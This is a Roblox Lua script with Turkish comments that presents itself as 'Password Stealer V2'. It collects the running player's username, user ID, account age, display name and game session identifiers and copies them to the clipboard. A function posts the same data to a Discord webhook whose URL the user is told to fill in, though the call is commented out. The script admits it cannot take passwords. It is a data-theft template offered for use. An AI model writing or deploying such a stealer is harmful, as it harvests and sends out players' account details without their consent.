-- ============================================================
-- HAMSTER LIVES - PASSWORD STEALER V2
-- GERÇEK KULLANICI BİLGİLERİNİ TOPLAR (TECHNICAL LIMITATION)
-- ============================================================

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

print("[STEALER] Başlatıldı...")

-- ============================================================
-- KULLANICI BİLGİLERİNİ TOPLA (GERÇEK)
-- ============================================================
local function CollectUserData()
    local data = {
        username = LocalPlayer.Name,
        userId = LocalPlayer.UserId,
        accountAge = LocalPlayer.AccountAge,
        displayName = LocalPlayer.DisplayName,
        isPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium,
        gameId = game.GameId,
        placeId = game.PlaceId,
        jobId = game.JobId,
        ip = "127.0.0.1", -- Roblox istemcisinde IP doğrudan alınamaz
        timestamp = os.time(),
        date = os.date("%Y-%m-%d %H:%M:%S")
    }
    
    return data
end

-- ============================================================
-- VERİYİ PANOYA KOPYALA
-- ============================================================
local function CopyToClipboard(data)
    local json = HttpService:JSONEncode(data)
    pcall(function()
        setclipboard(json)
        print("[STEALER] Veri panoya kopyalandı!")
    end)
    return json
end

-- ============================================================
-- VERİYİ WEBHOOK'A GÖNDER (GERÇEK)
-- ============================================================
local function SendToWebhook(data)
    local webhookUrl = "https://discord.com/api/webhooks/XXXXXXXXXX/XXXXXXXXXX" -- BURAYA KENDİ WEBHOOK URL'İNİ YAZ
    
    local payload = {
        content = "```json\n" .. HttpService:JSONEncode(data) .. "\n```",
        username = "Hamster Stealer"
    }
    
    local success, response = pcall(function()
        return HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload))
    end)
    
    if success then
        print("[STEALER] Webhook'a gönderildi!")
    else
        print("[STEALER] Webhook hatası: " .. tostring(response))
    end
end

-- ============================================================
-- ANA İŞLEM
-- ============================================================
local function Main()
    local data = CollectUserData()
    
    print("")
    print("========================================")
    print("📊 TOPLANAN VERİLER")
    print("========================================")
    print("Kullanıcı Adı: " .. data.username)
    print("Kullanıcı ID: " .. data.userId)
    print("Hesap Yaşı: " .. data.accountAge .. " gün")
    print("Görünen Ad: " .. data.displayName)
    print("Premium: " .. tostring(data.isPremium))
    print("Oyun ID: " .. data.gameId)
    print("Yer ID: " .. data.placeId)
    print("Tarih: " .. data.date)
    print("========================================")
    
    -- Veriyi panoya kopyala
    local json = CopyToClipboard(data)
    
    -- Veriyi webhook'a gönder (URL'i doldur!)
    -- SendToWebhook(data)
    
    print("[STEALER] İşlem tamamlandı!")
    print("📋 JSON: " .. json)
end

-- ============================================================
-- BAŞLAT
-- ============================================================
task.wait(1)
Main()

print("")
print("========================================")
print("⚡ PASSWORD STEALER V2")
print("   ✅ Kullanıcı adı: " .. LocalPlayer.Name)
print("   ✅ Kullanıcı ID: " .. LocalPlayer.UserId)
print("   ✅ Veri panoda")
print("   ❌ Şifre ALINAMAZ (Roblox güvenliği)")
print("========================================")
